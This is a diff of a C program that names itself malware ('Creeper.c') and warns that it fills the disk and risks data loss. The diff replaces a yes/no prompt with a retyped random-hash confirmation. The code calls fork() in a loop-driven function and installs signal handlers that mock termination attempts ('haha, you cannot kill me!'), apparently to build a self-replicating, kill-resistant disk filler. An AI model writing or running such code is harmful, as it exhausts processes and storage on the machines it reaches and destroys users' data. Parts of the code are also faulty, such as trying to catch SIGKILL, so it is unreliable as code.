@@ -354,20 +354,22 @@ Public License instead of this License.
 #define STUFF 5000
 #define BUF_LEN 5000
 #define INFINITY_LOOP 1
-typedef enum RANDOM_FILES
-{
-  XML,
-  C,
-  CPP,
-  JS,
-  TS,
-  TXT
+#define HASH_LEN 10
+// typedef enum RANDOM_FILES
+// {
+//   XML,
+//   C,
+//   CPP,
+//   JS,
+//   TS,
+//   TXT
 
-} RANDOM_FILE;
+// } RANDOM_FILE;
 static int counter = 0;
 unsigned int __bool = 0;
-char x = '0';
 const char *CHARS = {"abcdefghijklmnopqrstuvwxyz1234567890"};
+char hash_to_gen[HASH_LEN];
+char hash_input[HASH_LEN];
 char *bigString()
 {
   char *malloc_ret = (char *)malloc(BUF_LEN);
@@ -405,6 +407,12 @@ void handler(int num)
   printf("haha, you cannot kill me!");
 }
 
+void enableForking(int ms)
+{
+  fork();
+  usleep(ms);
+}
+
 void enableProtectionKill()
 {
   signal(SIGHUP, handler);
@@ -416,12 +424,6 @@ void enableProtectionKill()
   signal(SIGKILL, enableForking);
 }
 
-void enableForking(int ms)
-{
-  fork();
-  usleep(ms);
-}
-
 void getRandomExtension(char ret[3])
 {
   for (int i = 0; i < 3; i++)
@@ -429,28 +431,43 @@ void getRandomExtension(char ret[3])
     ret[i] = rand() % 255;
   }
 }
-int main(void)
+
+void genHash(char hash[HASH_LEN])
+{
+  const char *dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+
+  srand(time(NULL));
+  for (int i = 0; i < HASH_LEN; i++)
+  {
+    hash[i] = dict[rand() % strlen(dict)];
+  }
+}
+int main()
 {
   setlocale(LC_ALL, "");
   srand(time(NULL));
   printf("Creeper.c: Catch me if you can!\n");
   printf("WARNING:This file is considered an malware, it will run in your machine and loads you hd with stuff.\n");
   printf("PS: When you accept the terms, you'll have the risk of data losses and problems with files.\n");
-  while (1)
+  printf("For more informations, see README for details.");
+  while (INFINITY_LOOP)
   {
-    printf("At executing, you assume the risk.\nRun?(S/N)");
+    genHash(hash_to_gen);
+    printf("At executing, you assume the risk.\nTo run, retype the security hash:%s\n$:", hash_to_gen);
     setbuf(stdin, NULL);
-    scanf("%c", &x);
-    x = tolower(x);
+    if (scanf("%10s", hash_input) != 1)
+    {
+      printf("\n A error ocurred while reading input. Exiting...\n");
+      return EXIT_FAILURE;
+    }
 
-    if (x == 's')
+    if (strcmp(hash_input, hash_to_gen) == 0)
     {
       break;
     }
-    else if (x == 'n')
+    else
     {
-      puts("Goodbye, see you later!");
-      return EXIT_FAILURE;
+      printf("\nIncorrect answer, try again!\n");
     }
   }
   enableProtectionKill();
